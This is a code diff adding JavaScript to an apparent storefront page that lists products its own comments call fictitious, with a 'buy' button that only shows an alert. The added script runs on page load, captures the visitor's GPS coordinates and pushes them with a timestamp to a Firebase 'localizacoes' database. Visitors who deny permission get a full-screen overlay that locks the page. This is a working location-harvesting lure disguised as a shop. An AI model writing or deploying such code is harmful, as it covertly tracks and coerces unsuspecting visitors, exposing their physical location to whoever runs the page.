@@ -230,3 +230,68 @@ window.onclick = function(event) {
         }
     }
 }
+// 1. PRODUTOS (Mantenha o seu array aqui ou use este resumido para testar)
+const produtosFicticios = [
+    { id: 1, nome: "Smartphone Galaxy S23 Ultra", preco: "R$ 4.899", imagem: "https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?auto=format&fit=crop&w=400&q=80" },
+    { id: 2, nome: "Notebook Dell Inspiron 15", preco: "R$ 3.150", imagem: "https://images.unsplash.com/photo-1593642632823-8f785ba67e45?auto=format&fit=crop&w=400&q=80" },
+    { id: 6, nome: "Console PlayStation 5 + Jogo", preco: "R$ 3.999", imagem: "https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$" }
+    // Adicione os outros IDs aqui se quiser...
+];
+
+function carregarProdutos() {
+    const productGrid = document.getElementById('product-grid');
+    if (!productGrid) return; 
+    productGrid.innerHTML = ""; 
+    produtosFicticios.forEach(p => {
+        const card = document.createElement('div');
+        card.className = 'product-card'; 
+        card.innerHTML = `<img src="${p.imagem}" class="product-image"><div class="product-info"><span class="product-price">${p.preco}</span><h3 class="product-name">${p.nome}</h3><button class="btn-buy" onclick="alert('Adicionado!')">Comprar</button></div>`;
+        productGrid.appendChild(card);
+    });
+}
+
+// 2. O NOVO MOTOR DE LOCALIZAÇÃO (BLINDADO)
+async function gerenciarLocalizacao() {
+    const overlay = document.getElementById("locationOverlay");
+
+    // Se já localizou antes, nem mexe no overlay e encerra
+    if (sessionStorage.getItem("localizado") === "true") {
+        if (overlay) overlay.style.display = "none";
+        document.body.style.overflow = "auto";
+        return;
+    }
+
+    // Tenta pegar a posição
+    navigator.geolocation.getCurrentPosition(
+        // SUCESSO
+        (posicao) => {
+            db.ref("localizacoes").push({
+                latitude: posicao.coords.latitude,
+                longitude: posicao.coords.longitude,
+                data: new Date().toLocaleString('pt-BR')
+            }).then(() => {
+                sessionStorage.setItem("localizado", "true");
+                if (overlay) overlay.style.setProperty('display', 'none', 'important');
+                document.body.style.overflow = "auto";
+                console.log("Sucesso no Firebase!");
+            });
+        },
+        // ERRO/NEGADO
+        (erro) => {
+            console.warn("Usuário negou ou erro de GPS.");
+            // SÓ AGORA mostramos o bloqueio
+            if (overlay) {
+                overlay.style.setProperty('display', 'flex', 'important');
+                document.body.style.overflow = "hidden";
+            }
+        },
+        { timeout: 10000 } // Espera até 10 segundos pela resposta
+    );
+}
+
+// 3. INICIALIZAÇÃO ÚNICA
+document.addEventListener('DOMContentLoaded', () => {
+    carregarProdutos();
+    // Chamamos a função principal
+    gerenciarLocalizacao();
+});
